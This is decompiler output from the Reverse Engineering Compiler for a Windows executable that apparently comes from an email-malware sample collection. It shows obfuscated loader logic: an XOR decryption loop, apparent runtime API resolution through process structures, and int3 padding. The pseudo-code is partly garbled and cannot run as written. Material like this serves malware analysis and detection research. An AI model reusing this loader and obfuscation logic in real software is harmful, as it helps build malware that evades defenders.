/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0323/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x00401030 - 0x004010F4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ebp;
    ebp = esp;
    ecx = ecx + 1;
    esp = esp - 92;
    ecx = *(ebp - 20);
    edx = -4920983;
    eax = 0;
    L00401160();
    L00401180(ecx);
    *(ebp + 163006 - edx + 48) = edx;
    ecx = edx;
    ecx = ecx << 8;
    eax = -37550544 + ecx;
    eax = eax & 41683456 - ecx;
    edx = ecx << 2;
    ecx = eax + -166987700;
    ebx = *(ecx + edx);
    ecx = ecx + edx;
    ebx = ebx - 40;
    *(ebp + -163098 + *(ebp - 28)) = ebx;
    *(ebp - 20) = eax + *(ecx - 4) + 163122 - *(ebp - 28);
    eax = *(ebp - 28);
    ebx = *(ebp + -163110 + eax);
    L00401280();
    (save)ebp - 4;
    (save)4;
    (save)ecx;
    (save)esi;
    ecx = *(ebp + -163110 + *(ebp - 28));
    L004011B0();
    (save) *(ebp - 28);
    (save) *(ebp - 16);
    (save) *(ebp - 20);
    *(4035574 + *(ebp - 28))();
    ecx = ebp - 20;
    *ecx = *ecx + 163130;
    *ecx = *ecx - *(ebp - 28);
    return(*(ebp - 20)( *(ebp - 20) + 3018, 0));
}

stack space not deallocated on return
/*	Procedure: 0x004010F5 - 0x0040115E
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004010F5()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    esp = esp - 8;
    esi = ~esi;
    edx = *(ebp + 16);
    ebx = ebp + -652320;
    ecx = ebp + -652316;
    edx = edx << 1;
    ecx = *(ecx + edx * 2);
    edx = edx << 1;
    ebx = *(ebx + edx);
    esi = edx << 1;
    (save)119357319;
    eax = 292111156 + edx + esi;
    (restore) *(ebp - 8);
    *(ebp - 8) = *(ebp - 8) + edx;
    for(*(ebp - 4) = 1; 1; *(ebp - 4) = ~( *(ebp - 4))) {
        *ebx = *ebx ^ eax;
        if(ecx = ecx - 4) {
            break;
        }
        eax = eax + *(ebp - 8) + *(ebp - 4);
        ebx = ebx + 163086 - *(ebp + 16);
    }
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x0040115F - 0x0040115F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040115F()
{



    asm("int3");
}

/*	Procedure: 0x00401160 - 0x00401173
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401160()
{



    ecx = eax;
    return(*__imp__GetMailslotInfo(ecx, 0, ecx, eax, eax));
}

/*	Procedure: 0x00401174 - 0x0040117F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401174()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401180 - 0x004011A6
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401180()
{



    edi = edi - *(edi + -244640 + (990800 >> 2)) - -1073904898;
    return(L00401260(23));
}

/*	Procedure: 0x004011A7 - 0x004011AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011A7()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004011B0 - 0x004011BF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011B0()
{



    L004011C0();
    (restore)ebx;
    (save)ebx;
    return(*(L004011E0())());
}

/*	Procedure: 0x004011C0 - 0x004011D1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011C0()
{



    return(*( *( *( *( *(edi + 48 + ecx) + 12) + 28)) + 8));
}

/*	Procedure: 0x004011D2 - 0x004011DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011D2()
{



}

/*	Procedure: 0x004011E0 - 0x00401253
 *	Argument size: -4
 *	Local size: 8
 *	Save regs size: 0
 */

L004011E0(A27d06)
/* unknown */ void  A27d06;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = eax;
    eax = ecx;
    esi = ebx + -326104;
    eax = eax << 1;
    esi = *(esi + eax);
    edx = *( *(ebx + eax + -163022 - ecx) + ebx + 120) + ebx + 32;
    esi = *edx + ebx;
    edi = *(edx - 4) + ebx;
    edx = 1443033453 - ecx;
    *( & A27d06 - ecx) = edx;
    for(Vfffffff8 = 0; 1; Vfffffff8 = Vfffffff8 + 4) {
        eax = *(esi + Vfffffff8) + ebx + -163070 + ecx;
        if(Vfffffffc == *eax) {
            break;
        }
    }
    return(*(edi + Vfffffff8) + ebx);
}

/*	Procedure: 0x00401254 - 0x0040125F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401254()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401260 - 0x00401272
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401260(A8)
/* unknown */ void  A8;
{



    edi = *%fs:eax+0x1];
    return(-2);
}

/*	Procedure: 0x00401273 - 0x0040127F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401273()
{



}

/*	Procedure: 0x00401280 - 0x004012B4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401280()
{



    ebx = ebx << 7;
    eax = -16675456 + ebx;
    eax = eax >> 16;
    edx = (41749152 >> 1) - ebx;
    esi = eax << 16;
    eax = 20874556 - ebx;
    ecx = *(esi + *(esi + eax) + edx);
}

/*	Procedure: 0x004012B5 - 0x004012B7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012B5()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__RegCreateKeyW;
/* 0x00401008       0 */ /* unknown */ void 	__imp__ExtTextOutW;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetMailslotInfo;
/* 0x00401018       0 */ /* unknown */ void 	__imp__ShellAboutW;
/* 0x00401020       0 */ /* unknown */ void 	__imp__MapVirtualKeyExW;
/* 0x00401030       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
